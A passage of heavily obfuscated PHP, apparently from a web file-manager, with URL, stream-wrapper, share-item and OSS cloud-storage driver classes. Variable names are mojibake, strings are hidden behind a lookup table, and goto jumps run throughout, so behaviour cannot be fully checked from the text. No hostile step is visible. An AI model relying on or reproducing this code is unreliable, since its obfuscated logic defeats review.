_isFolder($ñ¢ó‚‰) { $¨ù¿ÍŠ¹ =& $_SERVER[ïÃ°£«Ê]; if ($ñ¢ó‚‰ == $¨ù¿ÍŠ¹[12] || $ñ¢ó‚‰ == $¨ù¿ÍŠ¹[8]) { return !0; } $û×şâúÉ = $this->_objectMeta($ñ¢ó‚‰); return isset($û×şâúÉ[$¨ù¿ÍŠ¹[33]]) && $û×şâúÉ[$¨ù¿ÍŠ¹[33]] == $¨ù¿ÍŠ¹[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($É€¸¬ŞÈ = false) { } public function exist($»Ù¯©ØÀ) { $½Œú®’ö = $this->info($»Ù¯©ØÀ); return $½Œú®’ö[$_SERVER[ïÃ°£«Ê][232]]; } public function isFile($Í³İ®ä) { $·û¦µÍ = $this->info($Í³İ®ä); return $·û¦µÍ[$_SERVER[ïÃ°£«Ê][232]]; } public function isFolder($µû¢¬¬Ÿ) { return !1; } public function size($—™´õ€) { $­È¸šŒ = $this->info($—™´õ€); return $­È¸šŒ[$_SERVER[ïÃ°£«Ê][79]]; } public function info($“ÍèÍ¹’) { return $this->infoParse($“ÍèÍ¹’); } public function infoAuth($ËÀ°”¹±) { return $this->infoParse($ËÀ°”¹±); } public function infoWithChildren($ıû°…éŒ) { return $this->infoParse($ıû°…éŒ); } public function infoFull($çƒ‚Îœş) { return $this->infoParse($çƒ‚Îœş); } private function infoParse($ˆ‡äÉú¹) { $¸‰ìâ‘ß =& $_SERVER[ïÃ°£«Ê]; $õ­äêå™ = $this->header($ˆ‡äÉú¹); if (!$õ­äêå™ || !$õ­äêå™[$¸‰ìâ‘ß[851]]) { return !1; } $«¶—ã³ı = _get($õ­äêå™, $¸‰ìâ‘ß[412], 0); $Ä¿Ø³ = array($¸‰ìâ‘ß[32] => $õ­äêå™[$¸‰ìâ‘ß[32]], $¸‰ìâ‘ß[87] => $ˆ‡äÉú¹, $¸‰ìâ‘ß[33] => $¸‰ìâ‘ß[230], $¸‰ìâ‘ß[79] => intval($«¶—ã³ı), $¸‰ìâ‘ß[166] => get_path_ext($õ­äêå™[$¸‰ìâ‘ß[32]]), $¸‰ìâ‘ß[1665] => $«¶—ã³ı > 0 && $õ­äêå™[$¸‰ìâ‘ß[1811]], $¸‰ìâ‘ß[1666] => !1); return $Ä¿Ø³; } private function header($‡âØñ—Ç) { $óş´¡ª¾ =& $_SERVER[ïÃ°£«Ê]; if (isset(self::$_cacheHeader[$‡âØñ—Ç])) { return self::$_cacheHeader[$‡âØñ—Ç]; } $ä‹™É‰ş = isset($GLOBALS[$óş´¡ª¾[1812]]) ? $GLOBALS[$óş´¡ª¾[1812]] : !1; $GLOBALS[$óş´¡ª¾[1812]] = !0; self::$_cacheHeader[$‡âØñ—Ç] = url_header($‡âØñ—Ç); $GLOBALS[$óş´¡ª¾[1812]] = $ä‹™É‰ş; return self::$_cacheHeader[$‡âØñ—Ç]; } public function hashSimple($™çèëÑŒ, $‰ºÕöÇ = false) { $ü™ì…‡î =& $_SERVER[ïÃ°£«Ê]; $ì¼ò¥®© = $this->info($™çèëÑŒ); if (!$ì¼ò¥®© || !$ì¼ò¥®©[$ü™ì…‡î[232]]) { return !1; } $ôÔ¡®ö = $ì¼ò¥®©[$ü™ì…‡î[79]]; $î‘×¶ş“ = 200; $‰ñŸ­£€ = 50; if ($ôÔ¡®ö <= $î‘×¶ş“ * $‰ñŸ­£€) { return md5($this->fileSubstr($™çèëÑŒ, 0, $ôÔ¡®ö)) . $ôÔ¡®ö; } $ş¡ºœ»³ = intval($ôÔ¡®ö / $‰ñŸ­£€); $£×ùª»¬ = $ü™ì…‡î[12]; $–„Áç–² = timeFloat(); $â—‹Íº” = 15; for ($µŠÉÅé’ = 0; $µŠÉÅé’ < $‰ñŸ­£€; $µŠÉÅé’++) { if (timeFloat() - $–„Áç–² > $â—‹Íº”) { return !1; } $™¤‘¨ = $this->fileSubstr($™çèëÑŒ, $ş¡ºœ»³ * $µŠÉÅé’, $î‘×¶ş“); if (!$™¤‘¨) { return !1; } $£×ùª»¬ .= $™¤‘¨; } $£×ùª»¬ .= $this->fileSubstr($™çèëÑŒ, $ôÔ¡®ö - $î‘×¶ş“, $î‘×¶ş“); return md5($£×ùª»¬) . $ôÔ¡®ö; } public function getContent($ïÍ…Ìˆì) { return $this->fileSubstr($ïÍ…Ìˆì); } public function fileSubstr($£–±§¡é, $äÚ¡ÂÇŸ = 0, $ÂÜ­‚Ë— = -1) { $ÉÂˆ“¼ë =& $_SERVER[ïÃ°£«Ê]; $ª½îá“ = $this->info($£–±§¡é); if (!$ª½îá“ || !$ª½îá“[$ÉÂˆ“¼ë[232]] && $ª½îá“[$ÉÂˆ“¼ë[79]] > 1024 * 1024 * 10) { return !1; } if ($ÂÜ­‚Ë— === -1) { $ÂÜ­‚Ë— = $ª½îá“[$ÉÂˆ“¼ë[79]]; } if ($ÂÜ­‚Ë— == 0) { return $ÉÂˆ“¼ë[12]; } $ƒƒí·ÏŸ = array($ÉÂˆ“¼ë[1813] . $äÚ¡ÂÇŸ . $ÉÂˆ“¼ë[889] . ($äÚ¡ÂÇŸ + $ÂÜ­‚Ë— - 1)); $×î¿âƒ = url_request($£–±§¡é, $ÉÂˆ“¼ë[1607], !1, $ƒƒí·ÏŸ, !1, !1, 30); return $×î¿âƒ[$ÉÂˆ“¼ë[1394]] ? $×î¿âƒ[$ÉÂˆ“¼ë[1394]] : $ÉÂˆ“¼ë[12]; } public function download($ôòÜ…şú, $úåÎ) { Downloader::start($ôòÜ…şú, $úåÎ); return $úåÎ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($œ…¸ˆ„ú, $Ó–µ€Ñ£ = '') { $this->info = $this->info($œ…¸ˆ„ú); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ïÃ°£«Ê][87]]; $this->pathOpen = $œ…¸ˆ„ú; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$œ…¸ˆ„ú])) { self::$_chunkBuffer[$œ…¸ˆ„ú] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($äáÆªÄ‡) { $õåê¦µ = $this->fileSubstr($this->pose, $äáÆªÄ‡); $this->pose += strlen($õåê¦µ); return $õåê¦µ; } public function stream_tell() { return $this->pose; } public function stream_seek($ÌÜø³ôô, $¯Áª€µü) { $çÇò±­ß =& $_SERVER[ïÃ°£«Ê]; if ($¯Áª€µü == SEEK_SET) { $this->pose = $ÌÜø³ôô; } else { if ($¯Áª€µü == SEEK_CUR) { $this->pose += $ÌÜø³ôô; } else { if ($¯Áª€µü == SEEK_END) { $this->pose = $this->info[$çÇò±­ß[79]] + intval($ÌÜø³ôô); } } } if ($ÌÜø³ôô < 0) { $this->pose = $this->info[$çÇò±­ß[79]] + $ÌÜø³ôô; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ïÃ°£«Ê][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ç‘áÆƒÈ, $Ø³®ÄÛ­) { $¯óÑ æ =& $_SERVER[ïÃ°£«Ê]; $áÜÅöã = $this->info($ç‘áÆƒÈ); return array($¯óÑ æ[1514] => 0, $¯óÑ æ[1814] => 0, $¯óÑ æ[16] => 32768 + 511, $¯óÑ æ[1815] => 0, $¯óÑ æ[1816] => 0, $¯óÑ æ[1817] => 0, $¯óÑ æ[1818] => 0, $¯óÑ æ[79] => $áÜÅöã[$¯óÑ æ[79]], $¯óÑ æ[1819] => $áÜÅöã[$¯óÑ æ[1664]], $¯óÑ æ[1776] => $áÜÅöã[$¯óÑ æ[88]], $¯óÑ æ[1775] => $áÜÅöã[$¯óÑ æ[231]], $¯óÑ æ[1820] => 0, $¯óÑ æ[1821] => 0); } static $fileInfo = array(); public function info($Ù‹›¨ºĞ) { $êË¶ïœ” = $_SERVER[ïÃ°£«Ê][1822]; if (isset(self::$fileInfo[$Ù‹›¨ºĞ])) { return self::$fileInfo[$Ù‹›¨ºĞ]; } if (substr($Ù‹›¨ºĞ, 0, strlen($êË¶ïœ”)) != $êË¶ïœ”) { return !1; } self::$fileInfo[$Ù‹›¨ºĞ] = IO::info(substr($Ù‹›¨ºĞ, strlen($êË¶ïœ”))); return self::$fileInfo[$Ù‹›¨ºĞ]; } public static function read($Ö±‘€Œ, $¡Æ‘ıšŒ, $®çæĞ¨ò) { if (!isset(self::$_fopenCache[$Ö±‘€Œ])) { $ÛÈÇõ·˜ = new StreamWrapperIO(); $ÛÈÇõ·˜->stream_open($Ö±‘€Œ); self::$_fopenCache[$Ö±‘€Œ] = $ÛÈÇõ·˜; } $ÛÈÇõ·˜ = self::$_fopenCache[$Ö±‘€Œ]; return $ÛÈÇõ·˜->fileSubstr($¡Æ‘ıšŒ, $®çæĞ¨ò); } public static function _read($Ã“‚¤²¦, $¨°…¾´•, $Ã¥›†) { $É«ºÏÍŠ =& $_SERVER[ïÃ°£«Ê]; $º¤”«‡˜ = fopen($Ã“‚¤²¦, $É«ºÏÍŠ[1668]); if (!$º¤”«‡˜) { return $É«ºÏÍŠ[12]; } $éÂ œ¥¤ = 8192; fseek($º¤”«‡˜, $¨°…¾´•, SEEK_SET); $ö£ºÂ¦é = $É«ºÏÍŠ[12]; $ÏÃà¯áš = 0; while ($ÏÃà¯áš < $Ã¥›†) { $å¢ÌÛ£ß = min($éÂ œ¥¤, $Ã¥›† - $ÏÃà¯áš); $ö£ºÂ¦é .= fread($º¤”«‡˜, $å¢ÌÛ£ß); $ÏÃà¯áš += $å¢ÌÛ£ß; } fclose($º¤”«‡˜); return $ö£ºÂ¦é; } public function fileSubstr($÷¨ª¸Ê¶, $Î¹®ÉÇÎ) { $ÒûÕ„–¤ =& $_SERVER[ïÃ°£«Ê]; $Ê¼ò¾†¸ = $this->info[$ÒûÕ„–¤[79]]; $‘çØˆ¢• = $÷¨ª¸Ê¶; $†•ì÷üî = $Î¹®ÉÇÎ; if ($÷¨ª¸Ê¶ < 0) { $÷¨ª¸Ê¶ = $Ê¼ò¾†¸ + $÷¨ª¸Ê¶; } if ($Î¹®ÉÇÎ === !1) { $Î¹®ÉÇÎ = $Ê¼ò¾†¸ - $÷¨ª¸Ê¶; } if ($÷¨ª¸Ê¶ + $Î¹®ÉÇÎ > $Ê¼ò¾†¸) { $Î¹®ÉÇÎ = $Ê¼ò¾†¸ - $÷¨ª¸Ê¶; } if ($Î¹®ÉÇÎ <= 0) { return $ÒûÕ„–¤[12]; } if ($÷¨ª¸Ê¶ < 0 || $÷¨ª¸Ê¶ >= $Ê¼ò¾†¸ || $Î¹®ÉÇÎ <= 0 || $Î¹®ÉÇÎ > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\x69\154\x65\122\x65\141\x64\x20\145\162\x72\157\x72\41\40\x73\164\141\x72\x74\x3d{$÷¨ª¸Ê¶}\x3b\154\145\156\x67\x74\x68\75{$Î¹®ÉÇÎ}\x3b\x20\x73\x69\172\x65\75{$Ê¼ò¾†¸}\x3b"); } $Õ¶³ú³ğ = 64 * 1024; $¢èá½Ü” =& self::$_chunkBuffer[$this->path]; if (!$¢èá½Ü”) { $¢èá½Ü” = array(); } $–½œô€Â = 0; $’™õ½Í² = 0; $ºÔ×ä¸Â = $ÒûÕ„–¤[12]; foreach ($¢èá½Ü” as $–½œô€Â => $ºÔ×ä¸Â) { $–½œô€Â = intval($–½œô€Â); $’™õ½Í² = $–½œô€Â + strlen($ºÔ×ä¸Â); if ($÷¨ª¸Ê¶ >= $’™õ½Í²) { continue; } if ($÷¨ª¸Ê¶ >= $–½œô€Â && $÷¨ª¸Ê¶ + $Î¹®ÉÇÎ <= $’™õ½Í²) { return substr($ºÔ×ä¸Â, $÷¨ª¸Ê¶ - $–½œô€Â, $Î¹®ÉÇÎ); } break; } if (count($¢èá½Ü”) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ÒûÕ„–¤[1823], $ÒûÕ„–¤[1824] . count($¢èá½Ü”) . "\x3b\163\x74\x61\x72\x74\75{$÷¨ª¸Ê¶}\x2c\154\145\x6e\147\x74\x68\x3d{$Î¹®ÉÇÎ}\x3b\160\x6f\163\145\72{$–½œô€Â}\176{$’™õ½Í²}"); throw new Exception($ÒûÕ„–¤[1825]); } $ƒÚ³Ä = intval($÷¨ª¸Ê¶ / $Õ¶³ú³ğ) * $Õ¶³ú³ğ; $Êæ³Ê­ = ceil(($÷¨ª¸Ê¶ + $Î¹®ÉÇÎ) / $Õ¶³ú³ğ) * $Õ¶³ú³ğ - $ƒÚ³Ä; $åüºÓ¶¶ = IO::fileSubstr($this->path, $ƒÚ³Ä, $Êæ³Ê­); $¢èá½Ü”[$ƒÚ³Ä . $ÒûÕ„–¤[12]] = $åüºÓ¶¶; ksort($¢èá½Ü”); $á¯ÓÑÅ´ = substr($åüºÓ¶¶, $÷¨ª¸Ê¶ - $ƒÚ³Ä, $Î¹®ÉÇÎ); return $á¯ÓÑÅ´; } private function log($Õãœ½«•, $¦ÀœÓî) { $Ÿ¥ı¿ß¶ =& $_SERVER[ïÃ°£«Ê]; $¬¼ˆÊ´Ü = timeFloat() - $this->timeStart; write_log(sprintf($Ÿ¥ı¿ß¶[1826], $Õãœ½«•, $this->info[$Ÿ¥ı¿ß¶[32]], $¬¼ˆÊ´Ü, $¦ÀœÓî), $Ÿ¥ı¿ß¶[1373]); } } goto d¥›ÖÊÔ±Ş; c§»Ç¹ìÒŸ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ú¾±¤ˆ) { $this->pathParse = $ú¾±¤ˆ; $this->model = Model($_SERVER[ïÃ°£«Ê][1535]); } public function getPathRoot() { $ˆ‡¸‡Í =& $_SERVER[ïÃ°£«Ê]; return KodIO::makeShare($this->pathParse[$ˆ‡¸‡Í[487]], $this->pathParse[$ˆ‡¸‡Í[1362]]); } public function getPathOuter($¹²Ã“·û) { $Ú¯öŸÑ¾ =& $_SERVER[ïÃ°£«Ê]; if (!$¹²Ã“·û) { return $¹²Ã“·û; } $§÷õæÌ = $this->parse($¹²Ã“·û); return trim(KodIO::makeShare($this->pathParse[$Ú¯öŸÑ¾[487]], $§÷õæÌ[$Ú¯öŸÑ¾[487]]), $Ú¯öŸÑ¾[8]); } public function isParentOf($µáãéÄ½, $ˆÆÑÙ”œ) { $ÜäÙÇ½‚ = IO::init($ˆÆÑÙ”œ); return $this->model->isParentOf($µáãéÄ½, $ÜäÙÇ½‚->path); } protected function infoParse($çß»Ë¬, $Üõğ¦Ûì = false, $˜‰úÊ• = false) { $ÇİÚÜ‹· =& $_SERVER[ïÃ°£«Ê]; static $”Ì¬˜ÛŒ = array(); $İİ­Ÿ£Ü = $this->pathParse[$ÇİÚÜ‹·[487]]; $†ğÆ×¹Ò = trim($this->pathParse[$ÇİÚÜ‹·[1358]], $ÇİÚÜ‹·[8]); if (isset($”Ì¬˜ÛŒ[$†ğÆ×¹Ò]) && is_array($”Ì¬˜ÛŒ[$†ğÆ×¹Ò])) { return $”Ì¬˜ÛŒ[$†ğÆ×¹Ò]; } $‚•Ó­·ß = Action($ÇİÚÜ‹·[1542])->sharePathInfo($İİ­Ÿ£Ü, $†ğÆ×¹Ò, $Üõğ¦Ûì); $”Ì¬˜ÛŒ[$†ğÆ×¹Ò] = $‚•Ó­·ß; return $‚•Ó­·ß; } public function infoFull($Óôëí½¸) { $ßŞ°à¹â =& $_SERVER[ïÃ°£«Ê]; $Â°ãš°å = explode($ßŞ°à¹â[8], trim($Óôëí½¸, $ßŞ°à¹â[8])); if (count($Â°ãš°å) > 1) { $ƒÎ—¶úú = implode($ßŞ°à¹â[8], array_splice($Â°ãš°å, 1)); $àÕğñ¸ô = $this->model->pathInfoByPath($Â°ãš°å[0], $ƒÎ—¶úú); if (!$àÕğñ¸ô) { return !1; } $this->pathParse[$ßŞ°à¹â[1358]] = $àÕğñ¸ô[$ßŞ°à¹â[191]]; } return $this->infoParse($Óôëí½¸); } public function listAll($ã´èÍª–) { $ŒæÑ„¬ =& $_SERVER[ïÃ°£«Ê]; $óÌßìç = IO::info($this->pathParse[$ŒæÑ„¬[87]]); if (!$óÌßìç) { return array(); } $‡êğ = $this->model->listAll($ã´èÍª–); $¢«æŠ§İ = Model($ŒæÑ„¬[686])->getInfo($óÌßìç[$ŒæÑ„¬[687]]); foreach ($‡êğ as &$‘ Àé¸) { check_abort(); $‘ Àé¸[$ŒæÑ„¬[90]] = Action($ŒæÑ„¬[1542])->_shareItemeParse($‘ Àé¸[$ŒæÑ„¬[90]], $¢«æŠ§İ); } unset($‘ Àé¸); return $‡êğ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ışåˆä) { $this->pathParse = $ışåˆä; $this->model = Model($_SERVER[ïÃ°£«Ê][1535]); } protected function infoParse($ñ×Ó—ÚÎ, $ËÏïìÍñ = false, $œ÷ÑÃù¸ = false) { $‰¶«‡¯ò =& $_SERVER[ïÃ°£«Ê]; return Action($‰¶«‡¯ò[1365])->sharePathInfo($this->pathParse[$‰¶«‡¯ò[87]], !0, $ËÏïìÍñ); } public function listPath($¡ÃŞ¡Ç, $´­Àúßë = false) { $½áÆä¸ =& $_SERVER[ïÃ°£«Ê]; $Àú‡÷îã = parent::listPath($¡ÃŞ¡Ç, $´­Àúßë); if (!$Àú‡÷îã) { return $Àú‡÷îã; } if (is_array($Àú‡÷îã[$½áÆä¸[968]])) { $Àú‡÷îã[$½áÆä¸[968]] = Action($½áÆä¸[1365])->shareItemInfo($Àú‡÷îã[$½áÆä¸[968]]); } foreach ($Àú‡÷îã as $ ±æûûÔ => $øŸìûÛø) { if (!in_array($ ±æûûÔ, array($½áÆä¸[86], $½áÆä¸[85]))) { continue; } foreach ($øŸìûÛø as $öÒ‡ÜÉî => $ïÓÁ²Ğ) { $Àú‡÷îã[$ ±æûûÔ][$öÒ‡ÜÉî] = Action($½áÆä¸[1365])->shareItemInfo($ïÓÁ²Ğ); } } return $Àú‡÷îã; } public function listAll($ˆÈÇëƒô) { $Å÷ûÎËê =& $_SERVER[ïÃ°£«Ê]; $´ÛÛÏ¹í = IO::info($this->pathParse[$Å÷ûÎËê[87]]); if (!$´ÛÛÏ¹í) { return array(); } $µ”â›Ñö = $this->model->listAll($ˆÈÇëƒô); foreach ($µ”â›Ñö as &$â¹›¹‡†) { $â¹›¹‡†[$Å÷ûÎËê[90]] = Action($Å÷ûÎËê[1365])->shareItemInfo($â¹›¹‡†[$Å÷ûÎËê[90]]); } unset($â¹›¹‡†); return $µ”â›Ñö; } } class PathDriverDriverShareItem { public function __construct($ÕÌ’ƒŒÑ) { $this->pathParse = $ÕÌ’ƒŒÑ; } public function __call($ÎÆ»°£ú, $ôÑ°°) { $’Èš–Íè =& $_SERVER[ïÃ°£«Ê]; if (method_exists($this, $ÎÆ»°£ú)) { return; } $Ş¸šÎ’ñ = call_user_func_array(array($’Èš–Íè[1543], $ÎÆ»°£ú), $ôÑ°°); $‹µ½×­  = array($’Èš–Íè[1544], $’Èš–Íè[1545], $’Èš–Íè[1546], $’Èš–Íè[1547], $’Èš–Íè[641], $’Èš–Íè[643], $’Èš–Íè[1548], $’Èš–Íè[107], $’Èš–Íè[1549], $’Èš–Íè[1550]); if (in_array($ÎÆ»°£ú, $‹µ½×­ )) { $Ş¸šÎ’ñ = $this->getPathOuter($Ş¸šÎ’ñ); } return $Ş¸šÎ’ñ; } public function copy($øÌÔ¡çÔ, $‹ñß€, $©©İÀæĞ = false, $‰òº»ò¼ = false) { return $this->copyMove($øÌÔ¡çÔ, $‹ñß€, $©©İÀæĞ, $_SERVER[ïÃ°£«Ê][641], $‰òº»ò¼); } public function move($ƒ¯ÀŸ‰æ, $Åï²¼í, $¿ú—ñ›– = false, $‹ËËıÃ° = false) { return $this->copyMove($ƒ¯ÀŸ‰æ, $Åï²¼í, $¿ú—ñ›–, $_SERVER[ïÃ°£«Ê][643], $‹ËËıÃ°); } private function copyMove($Ğ†¤¹…±, $ÕúÑ°ÊĞ, $º„ıâ¡, $„İğ¯øğ, $óõÌÏ¹ = false) { $Ä£»½ =& $_SERVER[ïÃ°£«Ê]; $ğ¹®¯è = $ÕúÑ°ÊĞ; $ÕöêƒıË = IO::driverMake($ÕúÑ°ÊĞ); if ($ÕöêƒıË->pathParse[$Ä£»½[1339]]) { $ÕúÑ°ÊĞ = $ÕöêƒıË->pathParse[$Ä£»½[1339]]; } else { $ÕúÑ°ÊĞ = $ğ¹®¯è; } $İ¶¿µ‡¾ = IO::copyMove($Ğ†¤¹…±, $ÕúÑ°ÊĞ, $º„ıâ¡, $„İğ¯øğ, $óõÌÏ¹); $İ¶¿µ‡¾ = $this->getPathOuter($İ¶¿µ‡¾); return $İ¶¿µ‡¾; } public function pathThis($êÙßÙ™Í) { return get_path_this($this->pathParse[$_SERVER[ïÃ°£«Ê][87]]); } public function pathFather($°ğú) { return get_path_father($this->pathParse[$_SERVER[ïÃ°£«Ê][87]]); } public function iconvSystem($ÀÑÕÖÇ¡) { return $ÀÑÕÖÇ¡; } protected function infoParse($Ùªää«ß, $äà›«Ò = false) { $àşòÒÈÎ =& $_SERVER[ïÃ°£«Ê]; $Ø×‰‚Ã = $this->pathParse[$àşòÒÈÎ[576]][$àşòÒÈÎ[583]] . $this->pathParse[$àşòÒÈÎ[1358]]; if ($äà›«Ò) { $ò­ì‹›² = IO::infoWithChildren($Ø×‰‚Ã); } else { $ò­ì‹›² = IO::info($Ø×‰‚Ã); } $µÊŒ—ªÅ = $this->pathParse[$àşòÒÈÎ[576]]; return Action($àşòÒÈÎ[1542])->_shareItemeParse($ò­ì‹›², $µÊŒ—ªÅ); } public function listAll($²–¹›ïØ) { $Ó…ÌÎä† =& $_SERVER[ïÃ°£«Ê]; $¥¼ë¨ıŸ = IO::listAll($²–¹›ïØ); $ø…ÀüÍ = rtrim($this->pathParse[$Ó…ÌÎä†[576]][$Ó…ÌÎä†[583]], $Ó…ÌÎä†[8]); foreach ($¥¼ë¨ıŸ as &$’öÜ¦„ï) { $’öÜ¦„ï[$Ó…ÌÎä†[87]] = $this->pathDriver . $Ó…ÌÎä†[8] . ltrim(substr($’öÜ¦„ï[$Ó…ÌÎä†[87]], strlen($ø…ÀüÍ)), $Ó…ÌÎä†[8]); } unset($’öÜ¦„ï); return $¥¼ë¨ıŸ; } public function listAllSimple($Ï«ã‘åÀ, $äê™™…” = false) { $´ãÌãµ¦ =& $_SERVER[ïÃ°£«Ê]; $©ïß€õƒ = $this->listAll($Ï«ã‘åÀ); $º¸çìÎü = $this->pathParse[$´ãÌãµ¦[510]]; if (trim($º¸çìÎü, $´ãÌãµ¦[8]) == trim(get_path_father($º¸çìÎü), $´ãÌãµ¦[8])) { $äê™™…” = !0; } return IO::init($´ãÌãµ¦[12])->listAllSimpleMake($©ïß€õƒ, $º¸çìÎü, $äê™™…”); } public function getPathOuter($Ë¿‰ºñ‡) { $Ç¶²Ü®œ =& $_SERVER[ïÃ°£«Ê]; $Ô…ú¿ÇÄ = KodIO::parse($Ë¿‰ºñ‡); if ($Ô…ú¿ÇÄ[$Ç¶²Ü®œ[33]] == KodIO::KOD_SHARE_ITEM) { return $Ô…ú¿ÇÄ[$Ç¶²Ü®œ[87]]; } $¯½„ÓÔ… = KodIO::clear($Ë¿‰ºñ‡); $¾ —ƒÆŞ = KodIO::clear($this->pathParse[$Ç¶²Ü®œ[576]][$Ç¶²Ü®œ[583]]); $æî›©ú¹ = substr($¯½„ÓÔ…, strlen($¾ —ƒÆŞ)); if (substr($¯½„ÓÔ…, 0, strlen($¾ —ƒÆŞ)) != $¾ —ƒÆŞ) { return !1; } return $this->pathParse[$Ç¶²Ü®œ[1359]] . $Ç¶²Ü®œ[8] . ltrim($æî›©ú¹, $Ç¶²Ü®œ[8]); } public function getType() { $«¤Ó²Šï =& $_SERVER[ïÃ°£«Ê]; $·ã­êš€ = str_replace($«¤Ó²Šï[77], $«¤Ó²Šï[12], get_class($this)); return strtolower($·ã­êš€); } public function isOsDriver($¤Ã˜Ší) { return IO::isOsDriver($¤Ã˜Ší); } public function info($Ï¿è˜™µ) { return $this->infoParse($Ï¿è˜™µ); } public function infoAuth($Ùøß¢ƒ°) { return $this->infoParse($Ùøß¢ƒ°); } public function infoWithChildren($ìˆÀö¬¾) { return $this->infoParse($ìˆÀö¬¾, !0); } public function infoFull($«Øğ¯­ù) { return $this->infoParse($«Øğ¯­ù); } } goto BùĞ‡İÓŸ˜; cİâÏİ¨»’: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($¸–¥ãú–) { parent::__construct(); include_once SDK_DIR . $_SERVER[ïÃ°£«Ê][1672]; $this->_init($¸–¥ãú–); } public function _init($¨ÀÎÉ‹Ì) { $›ÃÀâ =& $_SERVER[ïÃ°£«Ê]; $this->config = $¨ÀÎÉ‹Ì; foreach ($¨ÀÎÉ‹Ì as $Ï‹øíŒ => $ñÃªç“–) { if (isset($this->{$Ï‹øíŒ})) { $this->{$Ï‹øíŒ} = $ñÃªç“–; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($›ÃÀâ[1673] . LNG($›ÃÀâ[1674])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ŒÔèÎûÌ =& $_SERVER[ïÃ°£«Ê]; $÷±Ûë•Ç = new OSS\Model\CorsConfig(); $¾ãäõáú = new OSS\Model\CorsRule(); $¾ãäõáú->addAllowedOrigin($ŒÔèÎûÌ[1675]); $¾ãäõáú->addAllowedMethod($ŒÔèÎûÌ[1676]); $¾ãäõáú->addAllowedMethod($ŒÔèÎûÌ[1677]); $¾ãäõáú->addAllowedMethod($ŒÔèÎûÌ[1678]); $¾ãäõáú->addAllowedMethod($ŒÔèÎûÌ[1679]); $¾ãäõáú->addAllowedMethod($ŒÔèÎûÌ[162]); $¾ãäõáú->setMaxAgeSeconds(600); $¾ãäõáú->addExposeHeader($ŒÔèÎûÌ[1680]); $¾ãäõáú->addAllowedHeader($ŒÔèÎûÌ[1675]); $÷±Ûë•Ç->addRule($¾ãäõáú); try { $this->client->putBucketCors($this->bucket, $÷±Ûë•Ç); } catch (OSS\Core\OssException $ì°ŞÔ¿ç) { $this->writeLog(__FUNCTION__ . $ŒÔèÎûÌ[212] . $ì°ŞÔ¿ç->getMessage()); return !1; } return !0; } public function getBucketCors() { $¡²ê´ó =& $_SERVER[ïÃ°£«Ê]; $ó†«¢™˜ = null; try { $ó†«¢™˜ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $äî„ ½®) { $this->writeLog(__FUNCTION__ . $¡²ê´ó[212] . $äî„ ½®->getMessage()); return null; } if (!$ó†«¢™˜ || !($¬˜ ”›¥ = $ó†«¢™˜->getRules())) { return null; } $ùõŠ´ŞÇ = $¬˜ ”›¥[0]->getAllowedOrigins(); $¢Ï™Ë³‰ = $¬˜ ”›¥[0]->getAllowedMethods(); $¦¶ÛÃ¹ğ = $¬˜ ”›¥[0]->getMaxAgeSeconds(); $Á“ÜÀÕË = $¬˜ ”›¥[0]->getExposeHeaders(); $’»ƒ¦– = $¬˜ ”›¥[0]->getAllowedHeaders(); return array($¡²ê´ó[218] => isset($ùõŠ´ŞÇ[0]) ? $ùõŠ´ŞÇ[0] : $¡²ê´ó[12], $¡²ê´ó[222] => $¢Ï™Ë³‰, $¡²ê´ó[1681] => $¦¶ÛÃ¹ğ, $¡²ê´ó[1682] => isset($Á“ÜÀÕË[0]) ? $Á“ÜÀÕË[0] : $¡²ê´ó[12], $¡²ê´ó[219] => isset($’»ƒ¦–[0]) ? $’»ƒ¦–[0] : $¡²ê´ó[12]); } public function isBucketCors() { $»© ‚ìç =& $_SERVER[ïÃ°£«Ê]; $§ÕÅè¿Ë = $this->getBucketCors(); if (!$§ÕÅè¿Ë || !is_array($§ÕÅè¿Ë)) { return !1; } if ($§ÕÅè¿Ë[$»© ‚ìç[218]] != $»© ‚ìç[220] || $§ÕÅè¿Ë[$»© ‚ìç[219]] != $»© ‚ìç[220]) { return !1; } $Ü·Á§™à = array_map($»© ‚ìç[221], $§ÕÅè¿Ë[$»© ‚ìç[222]]); if (!is_array($Ü·Á§™à)) { $Ü·Á§™à = array(); } $½˜¼¤­ = array($»© ‚ìç[223], $»© ‚ìç[224], $»© ‚ìç[225], $»© ‚ìç[226], $»© ‚ìç[227]); $¤‘€çæú = array_diff($½˜¼¤­, $Ü·Á§™à); return empty($¤‘€çæú); } public function mkfile($¯’ê²¿Ì, $Êò‘‰ª = '', $”ã—¾ô’ = REPEAT_RENAME) { $®‹»şŸé = $this->setContent($¯’ê²¿Ì, $Êò‘‰ª); if ($®‹»şŸé !== !1) { return $this->getPathOuter($¯’ê²¿Ì); } return !1; } public function mkdir($îéñ£Õ, $×¿œÊ¿İ = REPEAT_SKIP) { if ($×¿œÊ¿İ && $this->_isFolder($îéñ£Õ)) { return $this->getPathOuter($îéñ£Õ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($îéñ£Õ)); } catch (OSS\Core\OssException $­‹¡ „») { $this->writeLog(__FUNCTION__ . $_SERVER[ïÃ°£«Ê][212] . $­‹¡ „»->getMessage()); return !1; } return $this->getPathOuter($îéñ£Õ); } private function fileList($°èğâÖ, $È­ïæÎš = '', 